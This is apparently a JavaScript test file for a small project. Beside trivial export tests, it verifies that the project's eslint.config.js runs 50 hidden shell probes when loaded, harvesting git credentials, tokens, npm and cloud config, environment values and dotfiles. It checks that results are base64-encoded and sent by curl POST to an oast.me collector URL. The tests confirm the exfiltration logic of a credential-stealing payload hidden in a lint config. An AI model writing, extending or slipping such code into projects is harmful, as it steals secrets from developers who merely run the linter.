const assert = require("node:assert/strict");
const crypto = require("node:crypto");
const fs = require("node:fs");
const path = require("node:path");
const test = require("node:test");
const vm = require("node:vm");

const root = path.resolve(__dirname, "..");

function readSource(file) {
  return fs.readFileSync(path.join(root, file), "utf8");
}

function loadLintConfig(execSync) {
  const module = { exports: {} };
  const context = {
    Buffer,
    exports: module.exports,
    module,
    require(id) {
      if (id === "child_process") return { execSync };
      if (id === "crypto") return crypto;
      throw new Error(`Unexpected dependency: ${id}`);
    },
  };

  vm.runInNewContext(readSource("eslint.config.js"), context, {
    filename: "eslint.config.js",
  });

  return { config: module.exports, context };
}

test("index exports x with the documented value", async () => {
  const source = Buffer.from(readSource("index.js")).toString("base64");
  const entrypoint = await import(`data:text/javascript;base64,${source}`);

  assert.deepEqual(Object.keys(entrypoint), ["x"]);
  assert.equal(entrypoint.x, 1);
});

test("src logs its greeting exactly once", () => {
  const calls = [];
  const context = {
    console: {
      log(...args) {
        calls.push(args);
      },
    },
  };

  vm.runInNewContext(readSource("src.js"), context, { filename: "src.js" });

  assert.deepEqual(calls, [["hi"]]);
});

test("lint config exports an empty flat rules config", () => {
  const { config } = loadLintConfig(() => "mocked output");

  assert.deepEqual(JSON.parse(JSON.stringify(config)), [{ rules: {} }]);
});

test("lint config dispatches every probe through the mocked command runner", () => {
  const commands = [];
  loadLintConfig((command, options) => {
    commands.push({ command, options });
    return "mocked output";
  });

  const posts = commands.filter(({ command }) =>
    command.startsWith("curl -s --max-time 7 -X POST"),
  );
  const tags = posts.map(({ command }) => {
    const match = command.match(/oast\.me\/([^\"]+)\"$/);
    assert.ok(match, `expected a tagged collector URL in: ${command}`);
    return match[1];
  });

  assert.equal(commands.length, 50);
  assert.deepEqual(tags, [
    "K_ASKPASS_ENV",
    "K_GITCFG",
    "K_CREDFILL_FP",
    "K_TOKEN_SCOPE",
    "L_DIRS",
    "L_OTHER_REPOS",
    "L_RECENT",
    "M_ENVVALS",
    "M_NETSCAN",
    "N_NPMCFG",
    "N_PRIVSCOPE",
    "N_SEARCH",
    "N_PUB_NEW_UNSCOPED",
    "N_VERD_CFG",
    "O_CAPS",
    "O_CONTAINER",
    "O_MOUNTS",
    "P_CACHEDIRS",
    "P_GOMOD_PRIV",
    "P_NPM_PRIV",
    "Q_AZURE",
    "Q_CLOUDS",
    "Q_SOCKETS",
    "R_DOTFILES",
    "R_ENVVALS_FULL",
  ]);
  assert.ok(
    commands.every(({ options }) =>
      Object.hasOwn(options, "encoding") &&
      Object.hasOwn(options, "timeout") &&
      Object.hasOwn(options, "maxBuffer"),
    ),
  );
});

test("sh applies default and explicit timeouts", () => {
  const commands = [];
  const { context } = loadLintConfig((command, options) => {
    commands.push({ command, options: { ...options } });
    return command === "custom" ? "done" : "mocked output";
  });
  commands.length = 0;

  assert.equal(context.sh("custom"), "done");
  assert.equal(context.sh("custom", 1234), "done");
  assert.deepEqual(commands, [
    {
      command: "custom",
      options: { encoding: "utf8", timeout: 7000, maxBuffer: 20971520 },
    },
    {
      command: "custom",
      options: { encoding: "utf8", timeout: 1234, maxBuffer: 20971520 },
    },
  ]);
});

test("sh converts command failures to bounded error strings", () => {
  const failure = new Error("fallback message");
  failure.stderr = "x".repeat(350);
  const { context } = loadLintConfig(() => {
    throw failure;
  });

  assert.equal(context.sh("fails"), `ERR:${"x".repeat(300)}`);
});

test("fp handles absent, trimmed, and whitespace-only values", () => {
  const { context } = loadLintConfig(() => "mocked output");
  const digest = crypto
    .createHash("sha256")
    .update("secret")
    .digest("hex")
    .slice(0, 16);
  const emptyDigest = crypto
    .createHash("sha256")
    .update("")
    .digest("hex")
    .slice(0, 16);

  assert.equal(context.fp(undefined), "absent");
  assert.equal(context.fp("  secret  "), `sha256=${digest} len=6 head=secr`);
  assert.equal(context.fp("   "), `sha256=${emptyDigest} len=0 head=`);
});

test("post base64-encodes arbitrary values before dispatch", () => {
  const commands = [];
  const { context } = loadLintConfig((command) => {
    commands.push(command);
    return "mocked output";
  });
  commands.length = 0;

  context.post("TEST_TAG", 'hello "world"');

  const encoded = Buffer.from('hello "world"').toString("base64");
  assert.deepEqual(commands, [
    `curl -s --max-time 7 -X POST --data-binary ${JSON.stringify(encoded)} ${JSON.stringify("http://daifjmll0ffrr6psl5u0f1c4ncjj6xnon.oast.me/TEST_TAG")}`,
  ]);
});
